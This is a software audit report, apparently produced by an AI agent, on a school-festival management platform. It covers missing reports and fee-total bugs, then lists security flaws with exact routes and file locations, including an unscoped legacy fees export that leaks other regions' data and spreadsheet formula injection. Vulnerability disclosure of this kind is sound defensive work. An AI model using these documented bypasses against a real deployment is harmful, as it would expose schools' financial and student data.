# Audit 3 of 3 — Reports, Security, Testing & Final Gap Analysis

**Date:** 2026-08-18
**Scope:** The Kalolsavam/Fest reporting surface (catalog inventory, exports, financial reconciliation), the module's security posture (authorization, injection, disclosure, rate-limiting, mass-assignment), report lifecycle/visibility gating (publication state vs. what the public/scoped actors can see), export output quality (fonts, encoding, formula-injection, empty states), a schema/technical-debt pass (indexes, constraints, transactions, N+1s), and full automated-test execution across backend (PHPUnit) and frontend (build/typecheck/unit/e2e).
**Findings covered:** 68, drawn from 8 audit sections, supplied as an already-independently-re-checked JSON dataset (per its own framing: "each independently re-checked except the two raw test-execution entries which ARE the primary evidence"). This report reorganizes and synthesizes those 68 findings — it does not re-derive them from scratch. It **does**, however, add its own layer of verification on top: every file:line citation sampled below was independently re-opened and confirmed before writing, and — because this is explicitly the audit's test-execution section — **the full backend test suite and the frontend build were independently re-executed fresh in this session**, not merely transcribed from the source data. Where my own fresh run disagrees with the source data (it does, in one specific way — two additional failing tests not present anywhere in the 68 source findings), that disagreement is reported exactly, not smoothed over. See §7.
**Repo state at time of writing:** branch `main`. The working tree is **not clean** — `git status` at the start of this pass showed 30+ modified, uncommitted files across controllers, services, models, Vue components, and `config/fest_fees.php`, spanning both the phased-regional-billing work the repo facts describe *and* an in-progress, unrelated grade-point/percentage-banding change to `FestGradePointService.php`/`FestGradeConfig.php` that this audit discovered independently (§7.4) because it is currently failing its own tests. No application source file was modified by this audit; one throwaway diagnostic file was written to the scratchpad directory (not the repo) and nothing was committed.

---

## 0. How to read this report

### 0.1 Severity rubric (as given for this audit)

| Severity | Meaning |
|---|---|
| **P0** | Cross-tenant exposure, severe data loss, or system-wide outage |
| **P1** | Broken core workflow, incorrect billing/results, unauthorized access, or frequent 500s |
| **P2** | Incomplete workflow, misleading report, or a significant edge case |
| **P3** | Usability, maintainability, or low-impact issue |

### 0.2 Classification taxonomy (as given for this audit)

`confirmed bug` · `security issue` · `data-integrity issue` · `broken workflow` · `missing feature` · `unsupported business rule` · `UI/navigation gap` · `report mismatch` · `performance risk` · `test gap` · `product decision required` · `stale documentation`

Six of the 68 source findings are **confirmatory** — investigated and found to be correct, working behavior, not a defect at all (`RPT-10`, `RECON-05`, `SEC-05[SecAudit]`, `TECH-01[Lifecycle]`, `POS-01`, `FE-BUILD-01`). None of the 12 categories above is "this is fine" — mislabeling a positive finding as, say, "product decision required" would misrepresent it, so this report uses one additional, explicitly-flagged label for those six: **not a gap (confirmatory)**. It sits outside the 12-category defect taxonomy on purpose.

No source finding's primary classification was `unsupported business rule` or `stale documentation`; one (`RPT-09`) is re-labeled `product decision required` below because its own recommendation is literally "confirm with product whether this is a real requirement," which fits that category better than the source's raw `missing_feature` tag. That single relabeling is noted at the finding itself.

### 0.3 Finding-ID collisions and how they're resolved here

The source dataset was assembled from **eight separate sub-audit passes** (Report inventory / Financial reconciliation / Security audit / Report lifecycle and visibility gating / Export quality / Technical audit / Test execution – backend / Test execution – frontend), each numbering its own findings independently. Six ID strings are consequently reused for **unrelated** findings across sections. This report tags every occurrence with the source section in brackets so every citation below is unambiguous:

| ID | Occurrences (topic, section, severity) |
|---|---|
| `SEC-01` | `[SecAudit]` formula-injection survey, P1 · `[Lifecycle]` region-export IDOR, **P0** · `[TestExec]` fees-CSV injection live proof, P1 |
| `SEC-02` | `[SecAudit]` public-route rate limiting, P2 · `[Lifecycle]` pre-publish athletic-records leak, P1 · `[TestExec]` password-reveal key shape, P3 |
| `SEC-03` | `[SecAudit]` mass-assignment backstop, P3 · `[Lifecycle]` legacy export skips lifecycle gate, P2 |
| `SEC-04` | `[SecAudit]` `publicWinnerRow()` gating fragility, P3 · `[Lifecycle]` qualification not revoked on unpublish, P2 |
| `SEC-05` | `[SecAudit]` dead `FestReportPolicy.php`, not a gap, P3 · `[Lifecycle]` phase-based publication leak, P1 |
| `TECH-01` | `[Lifecycle]` dead-policy re-confirmation, not a gap, P3 · `[TechAudit]` chest-number/participant DB constraints, P1 · `[TestExec]` `php artisan test` memory-limit crash, P2 |

All other IDs (`RPT-*`, `RECON-*`, `EXP-*`, `SEC-06`, `POS-01`, `SUM-01`, `BUG-*`, `TG-*`, `FE-*`) are unique across the whole dataset and are cited bare.

### 0.4 Severity and classification breakdown (all 68 source findings)

| Severity | Count |
|---|---|
| P0 | 1 |
| P1 | 11 |
| P2 | 28 |
| P3 | 28 |
| **Total** | **68** |

| Classification | Count |
|---|---|
| test gap | 17 |
| security issue | 13 |
| data-integrity issue | 9 |
| not a gap (confirmatory) | 6 |
| report mismatch | 6 |
| performance risk | 6 |
| confirmed bug | 5 |
| missing feature | 4 |
| broken workflow | 1 |
| UI/navigation gap | 1 |
| **Total** | **68** |

### 0.5 The 12 findings that need urgent-to-near-term attention (P0 + P1)

| ID | Section | One-line |
|---|---|---|
| `SEC-01[Lifecycle]` | Report lifecycle | **P0.** 4 legacy export routes (registrations/results/attendance/fees) skip the region-scoping middleware entirely; a region_admin gets every region's data. Empirically proven live over real HTTP. |
| `RECON-01` | Financial reconciliation | P1. 3 report/export builders show only the *last* fee receipt as "paid," not the accumulated total — multi-installment payments are silently under-reported. |
| `RECON-02` | Financial reconciliation | P1. 4 report/export builders omit a dedup filter and double-count a rollup row on phase/head-split billing — inflated receivables. |
| `RECON-04` | Financial reconciliation | P1. A second legacy fees-export route has zero region scoping — proven live via HTTP test: a region_admin retrieved another region's school name and fee total. |
| `SEC-01[SecAudit]` | Security audit | P1. No spreadsheet/CSV writer in the Fest module neutralizes formula-trigger characters — classic CSV/Excel injection (CWE-1236) across ~20+ call sites. |
| `SEC-02[Lifecycle]` | Report lifecycle | P1. Athletic-records and live/records pages gate only on a feature toggle, never on `results_published`/`schedule_published` — names and marks leak pre-publication. |
| `SEC-05[Lifecycle]` | Report lifecycle | P1. No code anywhere is aware of `phase_mode_enabled` for public visibility; publishing one phase exposes every phase's marks event-wide. |
| `EXP-01` | Export quality | P1. All 30/30 Fest report PDF views use Latin-only fonts; Malayalam names render as empty boxes. |
| `TECH-01[TechAudit]` | Technical audit | P1. `fest_groups` has zero indexes and no chest-number uniqueness (added, then force-dropped twice); duplicate chest numbers and duplicate item registrations both reproduced live. |
| `TECH-03[TechAudit]` | Technical audit | P1. Waitlist promotion has no lock/transaction guarding capacity — a race can overshoot a hard participant ceiling. Reproduced live. |
| `SEC-01[TestExec]` | Test execution | P1. Live HTTP proof of the CSV-injection class above via the fees-export route: raw, unneutralized `=HYPERLINK(...)` bytes captured in the response. |
| `BUG-03` | Test execution | P1. Board-result publish silently swallows a SQL error in the awards pipeline on every run — "Most Subject Toppers" never computes, no user-facing signal. |

---

## 1. Report inventory

**Catalog scale (confirmed):** `FestReportCatalog::exports()` defines **50 unique** export ids (not "49" as one source finding's own citation originally miscounted — corrected during this pass by direct extraction/dedup) and `interactivePages()` defines **22**. `SCHOOL_SAFE_EXPORT_IDS`, the allowlist gating which of those 50 a school admin may export, covers 21 of them.

| Report / capability | Status | Severity | Finding |
|---|---|---|---|
| Fee-collection, fees, fee-pending-schools, item-counts, mark-entry-status, head-wise, school-detailed, house-detailed, student-wise, item-wise, numbering-register, pending-approvals, attendance (the `REGION_ID_AWARE_IDS` group) on a phase-based hub | **Broken** — silently drops one phase's rows when a region has 2+ phase-children sharing one `region_id` | P2 | RPT-01 |
| Cross-school export blocking (`SCHOOL_SAFE_EXPORT_IDS` allowlist) | Working today, but untested and has 2 confirmed bypass routes (`groupRoster`, `attendanceSheet`) that skip the allowlist entirely | P2 | RPT-02 |
| Report-boundary regression suite | 1 pre-existing red test — asserts a 404 the app deliberately no longer returns (302 redirect instead) | P2 | RPT-03 |
| State-tier consolidated results/points/school-ranking export | **Missing** — `schoolRankings()` is computed but never exposed as a download; only inline Inertia page data | P2 | RPT-04 |
| Judge/staff assignment list report | Cataloged in the ERP Reports Hub as available/"retain"; resolves to nothing but the live CRUD screen | P3 | RPT-05 |
| Distinct-student headcount | **Missing** — the only related report counts registrations, over-counting students entered in multiple items | P3 | RPT-06 |
| Refunds/adjustments itemized register | **Missing** — only a Sahodaya-wide aggregate credit number exists, no per-school/per-event breakdown | P3 | RPT-07 |
| Accommodation/lodging tracking + report | **Missing entirely** — a feature gap, not merely a reporting gap (food/catering is fully built; lodging doesn't exist anywhere in the codebase) | P3 | RPT-08 |
| School-strength-category report | **Missing**; unclear if this maps to a real Kalolsavam requirement (the only "strength banding" in the codebase belongs to the unrelated membership-fee module) | P3 | RPT-09 |
| School/student registration, participation (student-wise & item-wise), rosters, head/discipline/category totals, chest numbers, ID cards, attendance, venue/stage schedule, clash report, mark-entry status, results, rankings, points, promotions, appeals, certificate counts | **Present, wired, tenant/event/school-scoped, real export formats** | — | RPT-10 |

### RPT-01 — Region-aware reports silently drop a phase's data on phase-based hubs
**Classification:** data-integrity issue · **P2** · **Actor:** Sahodaya admin / region admin

**Expected:** Opening a region's tile for any `REGION_ID_AWARE_IDS` report via `?region_id=` should include every phase's data for that region — matching what `FestReportScopeResolver` already resolves correctly for the identical input.

**Actual:** `regionAwareTargetEvent()` resolves the target purely via `FestEvent::regionalChild($regionId)` — a plain `where('region_id', $regionId)->first()`, no phase filter, no ordering. On a `phased_regional_billing` hub, two phases can legitimately spawn separate child events sharing one `region_id` (exactly the shape `FestPhasedRegionalBillingWorkflowTest::configureMcsFixture()` already builds in the repo's own suite), so `regionalChild()` silently returns one of the two and the other phase's rows never appear — no error, no warning.

**Evidence:** `app/Http/Controllers/SahodayaAdmin/Concerns/ResolvesRegionAwareReportEvent.php:17-32`; `app/Models/FestEvent.php:657-665` (`regionalChild()`, no ORDER BY/disambiguation); `app/Services/Events/Reports/FestReportScopeResolver.php:298-328` (the *correct* sibling — returns **all** matching region children via `pluck('id')->all()` when no phase is given, contrast confirmed); `app/Support/FestReportCatalog.php:301-330` (`REGION_ID_AWARE_IDS`). A throwaway test (`tests/Feature/Events/ZZZScratchRegionalChildPhaseCollisionTest.php`, written, run, deleted) built the exact 2-leaves-1-region collision from scratch and confirmed `regionalChild()` returns only one event while `FestReportScopeResolver::resolve()` on the identical fixture correctly returns both — 1 test, 9 assertions, passed.

**Impact:** A region admin viewing fee-collection or participation numbers on a multi-phase hub gets a silent undercount, in both the on-screen report and the matching export/PDF.

**Recommendation:** Make `regionalChild()`/`regionAwareTargetEvent()` phase-aware, or retire this parallel "target event substitution" mechanism in favor of routing `REGION_ID_AWARE_IDS` reports through `FestReportScopeResolver`'s already-correct event-id resolution.

### RPT-02 — School cross-school export block is real but fragile, with 2 confirmed bypasses
**Classification:** test gap · **P2** · **Actor:** School admin

**Expected:** The documented P0 fix ("school users can request cross-school fest exports") should be locked in by a permanent regression test, since `SCHOOL_SAFE_EXPORT_IDS` is a flat, hand-maintained allowlist covering 21 of the catalog's 50 export ids.

**Actual:** The control works today — independently re-verified with a fresh throwaway test (`tests/Feature/Events/ZZZScratchSchoolExportAllowlistTest.php`, written/run/deleted): `exportType=students` (not allowlisted) → 403; `exportType=registrations` (allowlisted) → 200 — but no permanent test asserts it, and `grep -rln "isSchoolSafe|SCHOOL_SAFE_EXPORT_IDS" tests/` returns zero matches. Worse, `FestSchoolReportController::groupRoster()` (:1318-1325) and `attendanceSheet()` (:1327-1334) call `FestReportService::export()` **directly**, bypassing the allowlist check entirely — both are safe *only* because they separately hardcode `school_id` in their own query, a second, independent, undocumented safety mechanism.

**Evidence:** `app/Support/FestReportCatalog.php:49-77` (21 allowlisted ids; stale comment at :35-45 says "none of these were confirmed to filter by school in this pass"); `FestEventReportAnalyticsService.php:1138-1151` (`teamSquadRows()`, the bypassed method, applies `->when($schoolId, ...)` correctly today).

**Impact:** This is exactly the bug class the original P0 fix addressed. The allowlist is one accidental edit — or one more dedicated bypass route — away from silently reopening cross-school data exposure, with nothing in CI to catch it.

**Recommendation:** Add a permanent test asserting every non-allowlisted catalog id 403s via the school-export route; route `groupRoster()`/`attendanceSheet()` through the allowlist-checked `export()` dispatcher instead of calling `FestReportService::export()` directly.

### RPT-03 — `FestSchoolReportBoundaryTest` is currently red
**Classification:** test gap · **P2** · **Actor:** School admin

**Expected:** `tests/Feature/Events/FestSchoolReportBoundaryTest.php` should pass — a school admin should get 404 opening a report route for an event whose type doesn't match the URL's program prefix.

**Actual:** It fails. The app now **redirects (302)** on this mismatch instead of aborting (404) — a deliberate UX change (`EnsureSchoolFestProgramMatchesEvent.php:49-67` computes the correct program and redirects there for GET requests with a resolvable tenant; `abort_unless(...,404,...)` at :63-67 fires only for non-GET requests or an unresolvable tenant) that the test was never updated for. **Independently reproduced fresh in this pass** — see §7.2, row 1: `Failed asserting that 302 is identical to 404.`, byte-identical to the source claim.

**Impact:** A currently-red test sits inside the exact area this audit covers, undermining confidence that "the report boundary tests pass" and risking masking a real future regression in the same redirect logic.

**Recommendation:** Update the assertion to expect the redirect, or add a companion test for the cases where the middleware's `abort_unless` branch still legitimately applies (non-GET / unresolved tenant).

### RPT-04 — No State-tier consolidated results/points export
**Classification:** missing feature · **P2** · **Actor:** State admin

**Expected:** A cross-Sahodaya, exportable/printable results/points/school-ranking summary at the State Kalolsavam tier, analogous to the Sahodaya-level Overall Ranking / Medal Tally exports.

**Actual:** `StateResultPublicationService::schoolRankings()` (:84-117) groups published `StateFestMark` rows by school with points/firsts/seconds/thirds — and is returned only as an inline Inertia prop from `StateFestWorkspaceController::show()`. `StateFestWorkspaceController` has exactly 8 public methods, none returning anything but `Inertia::render()` or a redirect. A grep for pdf/csv/export/print/report across both `routes/web.php` and the separate `routes/state.php` (a second, "additive, not a replacement" State route file this pass found independently) returns zero matches.

**Evidence:** `routes/web.php:137-148`; `StateFestWorkspaceController.php` (208 lines, 8 methods); `StateResultPublicationService.php:84-117`.

**Impact:** The body running the top tier of the Kalolsavam hierarchy has no way to distribute a consolidated results/points sheet — every Sahodaya-level event gets dozens of exports; State gets none.

**Recommendation:** Add at minimum a PDF/CSV export of `schoolRankings()`, mirroring the existing Sahodaya-level overall-ranking/medal-tally pattern.

### RPT-05 — Judge/staff "assignment list" reports don't exist beyond the live CRUD screen
**Classification:** report mismatch · **P3** · **Actor:** Sahodaya admin

**Expected:** `RPT-TCH-011`/`RPT-KAL-003` ("Judge assignment list") and `RPT-SPT-022` ("Official assignment list") in the ERP Reports Hub catalog should produce an actual list/export.

**Actual:** All three resolve to nothing but the live CRUD management screen. `FestJudgeAssignmentController`/`FestEventStaffController` each expose only `index`/`store`/`destroy` — no export method. The only catalog id containing "judge" is `judge-sheet` (a per-item **blank scoring sheet**, not a roster); no id containing "staff" or "official" exists anywhere.

**Evidence:** `ReportRegistry.php:150,259,300` (all 3 catalog rows, notes synthesized as "retain"/"Kalotsav event → Reports" even though nothing runnable backs them).

**Impact:** A Sahodaya cannot print "who is judging/staffing what" for an event day; staff must manually retype or screenshot the live admin page.

**Recommendation:** Add a real export to `FestJudgeAssignmentController`/`FestEventStaffController` and register it in the catalog, or correct the ERP catalog's note text so it stops presenting a non-existent report as available.

### RPT-06 — No distinct-student headcount
**Classification:** report mismatch · **P3** · **Actor:** Sahodaya admin

**Expected:** A way to answer "how many different students actually took part," since one student can register for several items.

**Actual:** `participationCounts()` computes `'total' => $regs->count()` over a per-registration collection — a student entered in 3 items is counted 3 times. No `distinct student_id` computation exists anywhere in the analytics layer (confirmed by grep across the 3 analytics services).

**Evidence:** `FestReportController.php:366,375`.

**Impact:** No built-in report can answer "how many of our students took part" — only "how many item-entries were made," which over-counts multi-item students.

**Recommendation:** Add a distinct-`student_id` count to Participation Counts, computed from the same collection already loaded there.

### RPT-07 — No itemized refunds/adjustments register
**Classification:** missing feature · **P3** · **Actor:** Sahodaya admin / finance

**Expected:** An itemized, exportable list of every fee refund/adjustment (school, event, amount, reason, date).

**Actual:** Fest refunds are modeled only as `FestFeeCredit` balances, surfaced solely as one Sahodaya-wide aggregate number on the Finance Hub dashboard (`$festCredit = FestFeeCredit::outstanding()->...->sum('amount')`). Zero `fee-credit` routes exist, zero `FestFeeCredit` references exist in the report catalog, and no "adjustment"/"refund" model exists anywhere in `app/Models`. By contrast, `RPT-PAY-014`'s waiver register genuinely is Sahodaya-wide and itemized — the asymmetry this finding relies on.

**Evidence:** `FestInvoiceService.php:281-285`; `FinanceHubController.php:42-44,102`.

**Impact:** Finance staff can see "we owe schools X in total credit" but not which schools, for which events, or why — a database query is the only way to reconcile.

**Recommendation:** Add an itemized `FestFeeCredit` register (school, event, amount, reason, issued/consumed status), mirroring the working waiver-register pattern.

### RPT-08 — Accommodation/lodging is entirely absent (feature gap, not just a reporting gap)
**Classification:** missing feature · **P3** · **Actor:** School admin / Sahodaya admin

**Actual:** Food/catering is fully built (dedicated controllers, ~18 routes, real export ids and analytics). Accommodation/lodging does not exist anywhere — `grep -rln "lodging|hostel|boarding" app/ resources/js -i` returns exactly one match, and it's the word "onboarding" inside an unrelated comment.

**Impact:** Any Sahodaya needing to track participant lodging for a multi-day residential fest has no feature, and therefore no report.

**Recommendation:** Out of scope to build within an audit; flagged as a confirmed, complete absence for product prioritization.

### RPT-09 — "School-strength-category" report/banding
**Classification:** product decision required *(source label: missing_feature — relabeled here per the finding's own recommendation text)* · **P3** · **Actor:** Sahodaya admin

**Actual:** No such concept exists anywhere in the fest-reporting or fest-fee code. The only "strength banding" in the codebase belongs to a wholly different module (`KannurLegacyMembershipImporter::combinedSlabs()`, Sahodaya membership subscription fees). `age-group-matrix` and `category-wise-students` are the closest Kalolsavam analogs — banding by age and class-category respectively, not enrollment size.

**Recommendation:** Confirm with product whether this maps to a real Kalolsavam requirement distinct from the membership-only band concept found here; if so, build it against `FestSchoolEventFeeService`'s own school population.

### RPT-10 — The bulk of the requested report inventory is solid (confirmatory)
**Classification:** not a gap (confirmatory) · **P3**

**Actual:** School registration, student registration, student-wise & item-wise participation, group/team roster, head/discipline/category totals, chest-number register, ID cards, attendance, venue & stage schedule, clash report, mark-entry status, results, rankings, points, qualification/promotions, appeals, and certificate counts are all confirmed present, tenant/event/school-scoped, and backed by real export formats — `FestStage`, `FestVenue`, `FestAppeal`, `Certificate` models and controllers all exist and are wired; `appealsRegister()`/`certificate-counts` are real, non-stub queries.

**Recommendation:** No action needed beyond the specific gaps in RPT-01 through RPT-09; treat this as the regression baseline.

---

## 2. Financial reconciliation

| Finding | Classification | Severity | One-line |
|---|---|---|---|
| RECON-01 | confirmed bug | **P1** | "Paid" in 3 report/export builders reads only the last-uploaded receipt, not the accumulated `amount_paid` — multi-installment payments silently under-reported |
| RECON-02 | report mismatch | **P1** | 4 report/export builders omit `->forAmountAggregation()`, double-counting the null-head/null-phase rollup row alongside real per-head/per-phase rows |
| RECON-03 | data-integrity issue | P2 | `forceApprove()` overwrites the receipt's real amount instead of using `waiver_amount`/reason; no lock, no overpayment-to-credit reconciliation |
| RECON-04 | security issue | **P1** | A legacy `export.fees` route bypasses `FestReportScope` entirely — a region_admin gets every region's fee data; empirically proven via HTTP test |
| RECON-05 | not a gap (confirmatory) | P3 | The core payment-reconciliation invariant and its 2 existing audit tools are sound; the blind spot is the report-building layer — exactly where RECON-01/02 live |
| RECON-06 | test gap | P2 | Zero tests reference the 3 buggy classes/methods at all; no preview-vs-export money parity test exists anywhere |

### RECON-01 — "Paid" shows the last receipt, not the accumulated total
**Classification:** confirmed bug · **P1** · **Actor:** Sahodaya admin (Fee Collection report + export) and School admin (own fee summary)

**Expected:** A school's "Paid" figure in any fee report should equal `FestSchoolEventFee.amount_paid` — the model's own authoritative, accumulated total, already used correctly by `outstandingBalance()`/`isFullyPaid()`.

**Actual:** Three independent methods compute "paid" as `(float) ($fee->feeReceipt?->amount ?? 0)` — a single `belongsTo` FK that points only at the **most-recently-uploaded** receipt. `attachPayment()` repoints `fee_receipt_id` on every new upload; `approve()` never repoints it back, only calls `refreshPaidState()`, which correctly re-sums **all** approved receipts into `amount_paid`. A school paying via 2+ separately-approved receipts gets "Paid" silently reported as just the last receipt, while the same row's `status` correctly says approved/fully-paid — an internally contradictory report row. `SchoolPaymentHistoryService::mapFestRow()` reads the correct `amount_paid` for the identical fee at the identical moment, so two portals disagree with each other.

**Evidence:** `FestEventReportAnalyticsService.php:154` (`feeCollectionRows()`); `FestExportService.php:172` (`fees()`, the Fee/Payment Report XLS export); `FestSchoolReportAnalyticsService.php:36` (`feeSummary()`). Contrast: `SchoolPaymentHistoryService.php:191` reads `(float) $f->amount_paid` correctly. Mechanism confirmed directly in code: `FestSchoolEventFeeService::attachPayment()` (:1403-1425) repoints `fee_receipt_id` on every upload; `approve()` (:36-104) never touches it, only calls `refreshPaidState()` (`TracksPartialPayments.php:53-72`, sums all `status='approved'` receipts). *Correction to the source finding's own aside:* `FestExportService.php:44` is **not** the same bug pattern — it operates on `FestRegistration`, a model with no `TracksPartialPayments`/`amount_paid` at all (single-shot per-registration fee, no multi-receipt accumulation to get wrong).

**Repro:** Fee with `total_due=10000`. Receipt #1 approved for 3000 (`amount_paid`→3000, status `partial`). Receipt #2 approved for the remaining 7000 (`amount_paid`→10000, status `approved`). Fee Collection report / export shows "Paid: 7000" while "Status: approved."

**Impact:** Finance staff and schools are shown a materially wrong "amount paid" for any fee settled in installments, while the same row claims fully-paid status.

**Recommendation:** Replace `$fee->feeReceipt?->amount ?? 0` with `(float) $fee->amount_paid` at all three call sites; keep the `feeReceipt` relation only for "most recent receipt number/date" display.

### RECON-02 — 4 report builders double-count the fee rollup row
**Classification:** report mismatch · **P1** · **Actor:** Sahodaya admin (exports, Finance Hub, Registration & Fees Register, State ERP report)

**Expected:** Every report summing `FestSchoolEventFee.total_due`/`outstandingBalance()` per school should exclude the `head_id=null`/`phase_id=null` rollup row that `recalculateAggregateForPerHeadEvent()`/`recalculateAggregateForPerPhaseEvent()` persist alongside the real per-head/per-phase rows — via the model's own `scopeForAmountAggregation()`, already applied correctly in 26 other call sites (this pass independently counted 26, exceeding the source's claimed "20+", across `FestEventFeesController`, `PaymentReconciliationController`, `FestPaymentsController`, `FinanceHubController`, `LedgerReportingService`, `FestEventReportAnalyticsService`, `ProgramHubDataService`, `ErpReportQueryService`, `FestCrossEventReportService`, `QueriesExtendedReports`, `AuditPaymentIntegrity`).

**Actual:** Four builders query the same table for the same purpose **without** `->forAmountAggregation()`, so for any event on per-head (legacy `sports_composite`) or per-phase (non-regional `phase_mode_enabled`) billing, they sum both the rollup row and every head/phase-specific row for the same school — inflating totals. Two of the four buggy/correct pairs sit inside the **same class**: `FinanceHubController::receivables()` (:140-159, no scope) vs. `FinanceHubController::index()` (:30-31, has the scope, same file); `FestCrossEventReportService::feeCollection()` (:408-420, no scope) vs. the same file's `:231-243`/`:1175-1188` (both correctly scoped).

**Evidence:** `FestExportService.php:149-156` (`fees()`) and `:213-220` (`feeBreakdown()`) — their ad hoc `->when($event->usesPhasedRegionalBilling() && !$scope?->registrationBatchId, ...)` filter does **not** cover per-head or per-phase-non-regional billing (`usesPerPhaseBilling()` explicitly returns false whenever `usesPhasedRegionalBilling()` is true, and the rollup rows never set `registration_batch_id`, so it stays null and the ad hoc filter never fires for those modes); `FestRegistrationRegisterService.php:55-69`; `FestCrossEventReportService.php:408-420`. The model's own docblock (`FestSchoolEventFee.php:34-42`) names this exact double-count risk as `forAmountAggregation()`'s purpose.

**Impact:** An admin trusting the exported spreadsheet, Receivables drill-down, Registration & Fees Register, or the state-level export over the on-screen preview materially overstates how much a school (or the Sahodaya as a whole) is owed, for any phase-split or legacy per-head event.

**Recommendation:** Add `->forAmountAggregation()` to the four flagged builders, matching the existing pattern.

### RECON-03 — `forceApprove()` overwrites the real receipt amount instead of waiving the delta
**Classification:** data-integrity issue · **P2** · **Actor:** Sahodaya admin (force-approve action)

**Expected:** Waiving a residual mismatch should use `FeeReceipt`'s own `waiver_amount`/`waiver_reason`/`waived_by_user_id` columns, preserving the receipt's true uploaded amount; any genuine overpayment surfaced through this path should generate a `FestFeeCredit`, exactly as `approve()` already does.

**Actual:** `FestSchoolEventFeeController::forceApprove()` (:350-407) directly overwrites the school's real `FeeReceipt.amount` to the current `total_due` (`$receipt->update(['amount' => $due, ...])` at :368) — discarding whatever the school's uploaded proof actually showed. No `waiver_amount`/`waiver_reason` is recorded, no pre-overwrite amount is captured in the audit log, no `lockForUpdate()` guards the same total_due-changed-mid-flight race `approve()` explicitly locks against, and no overpayment-to-`FestFeeCredit` reconciliation exists. The docblock misdescribes the mechanism as "bringing total_due down to amount_paid" — the code never touches `total_due`; it rewrites the receipt instead. The UI only surfaces this for `status='partial'` rows, but the controller has no server-side status gate, so the overpayment/race scenario is reachable, not hypothetical.

**Evidence:** `FestSchoolEventFeeController.php:350-407,368,400-404`; contrast `approve()` at :42,60-84; `FeeReceipt.php:25-33` (unused `waiver_*` columns already exist).

**Impact:** The system's own "official" payment record can end up numerically disagreeing with the school's real uploaded proof after this admin action, with no trail to reconstruct the original figure in a dispute.

**Recommendation:** Record the delta via `waiver_amount`/`waiver_reason`; add the same overpayment-to-credit reconciliation and `lockForUpdate()` guard `approve()` already has; fix the docblock.

### RECON-04 — Legacy fees-export route has zero region scoping (empirically proven)
**Classification:** security issue · **P1** · **Actor:** Region-scoped Sahodaya admin

**Expected:** Every route serving the Fest fee/payment export should apply the same `FestReportScope` restriction the canonical export path applies.

**Actual:** A second, legacy route (`export.fees`, `GET /sahodaya-admin/{tenantId}/events/{event}/export/fees` → `FestExportController::fees()`) duplicates the catalog-driven route but calls `FestExportService::fees($event)` with **no** `$schoolId` and **no** `FestReportScope` at all. **Empirically confirmed via an executed scratch test** (built and run this pass, then deleted): a region_admin assigned to Region A only, hitting this legacy route over real HTTP through the real middleware stack for a two-region hub, received School B's (Region B) name and its distinctive fee total in the response — while the canonical scoped path correctly excluded Region B for the identical actor.

**Evidence:** `routes/web.php:1263` (`export.fees`) vs. `:1396` (canonical `reports/export/{exportType}`); `FestExportController.php:32-37` (no scope/schoolId built); `FestReportController.php:838-878` builds `$targetEvent` via `regionAwareTargetEvent()` and passes a real scope through `FestReportService.php:390`; `EnsureSahodayaAdmin.php:84-95` only checks tenant-membership, never filters data within an event the actor legitimately has a region-scoped role on. Scratch test `tests/Feature/SahodayaAdmin/ZZScratchExportFeesRegionLeakTest.php` (written, run, deleted): 1 passed, 9 assertions — canonical path correctly excludes Region B; legacy `export.fees` returns both regions plus a `424242` fee-total marker planted specifically on the Region B school. *Correction to the source finding's own recommendation:* `export.attendance` (the sibling legacy route) is **not** orphaned — `Attendance.vue:342` links to it directly; only `export.fees` (and, pending individual verification, `export.registrations`/`export.results`) should be removed or fixed.

**Impact:** Any currently-assigned region_admin can retrieve every school's fee/payment data across all regions of an event today, via a URL with the same shape as a sibling route already live-linked in the UI.

**Recommendation:** Remove `export.fees`/`FestExportController::fees()`, or rewrite it to build and honor a `FestReportScope` the way `FestReportController::export()` does. Do not remove `export.attendance` in the same pass.

### RECON-05 — Core reconciliation invariant and its audit tools are sound (confirmatory)
**Classification:** not a gap (confirmatory) · **P3**

**Actual:** `outstandingBalance() = max(0, total_due - amount_paid)` and `refreshPaidState()`'s re-summing of every approved receipt are sound, and are redundantly monitored by `PaymentReconciliationController` and the `finance:audit-payment-integrity` CLI command — both correctly apply `->forAmountAggregation()`. Re-executed both: `php artisan test tests/Feature/PaymentReconciliationTest.php` → `{"result":"passed","tests":2,"passed":2,"assertions":27}`. `php artisan finance:audit-payment-integrity --json` → against this environment's real reachable Postgres (`127.0.0.1:5432` per `.env` — note this is a raw `artisan` command outside `phpunit.xml`'s sqlite override, so it is not in conflict with the confirmed repo fact that *phpunit-run* tests use in-memory sqlite; a bare `artisan` invocation simply uses the real `.env` connection, which happens to be reachable in this sandbox) returned `{"sahodaya":"Malappuram Sahodaya","checked":{"carriers":7,"receipts":1,"credits":0,"payouts":0,"journals":1},"issues":[]}` — an exact reproduction.

**Impact/why this matters:** This sharpens exactly where RECON-01/02 bite — neither reconciliation tool touches the *report-building* layer (`feeCollectionRows()`, `FestExportService`, `FestRegistrationRegisterService`, `FestCrossEventReportService`); both only check the model/ledger layer, which is why RECON-01/02 exist undetected today despite this otherwise-solid safety net.

**Recommendation:** Extend `finance:audit-payment-integrity` (or a new lightweight check) to also assert report-layer totals reconcile against the same `FestSchoolEventFee` source.

### RECON-06 — Zero tests touch the buggy report/export classes at all
**Classification:** test gap · **P2**

**Actual:** `grep -rlni "FestExportService|feeSummary|FestSchoolReportAnalyticsService" tests/` returns **zero** hits anywhere in the entire suite — no test of any kind references these classes/methods. The only "parity" tests that exist (`RegionScopedAccessParityTest`, `RegionAdminReportContainmentTest`) cover access-control row-level parity, not money-value agreement.

**Impact:** RECON-01/02 could regress again immediately after being fixed, or new report builders could reintroduce the identical one-line omission, with nothing in the suite to catch it.

**Recommendation:** Add the regression tests listed under RECON-01/02, plus a generic "preview total equals export total" parity test parametrized across the finance-dataset report ids in `FestReportCatalog::SCOPE_METADATA`.

---

## 3. Security findings

*(This section covers the source dataset's dedicated "Security audit" pass — 5 findings. Security issues discovered inside the report-lifecycle investigation are presented in §4, and the CSV-injection class recurs, from a different angle, in §5 (`EXP-02`) and §7 (`SEC-01[TestExec]`) — all three describe the same underlying vulnerability class and are cross-referenced rather than duplicated.)*

| Finding | Classification | Severity | One-line |
|---|---|---|---|
| SEC-01[SecAudit] | security issue | **P1** | No spreadsheet/CSV writer in the Fest module neutralizes leading `=`/`+`/`-`/`@` — CSV/Excel formula injection (CWE-1236) across ~20+ call sites |
| SEC-02[SecAudit] | security issue | P2 | The public, unauthenticated `/fest/*` route group (15 routes incl. search, PDF render, live data) has zero rate limiting, unlike every sibling public group in the same file |
| SEC-03[SecAudit] | security issue | P3 | `FestEvent`/`FestSchoolEventFee` expose tenant/financial/workflow columns via `$fillable` with no `$guarded` backstop; no live exploit found, pure defense-in-depth gap |
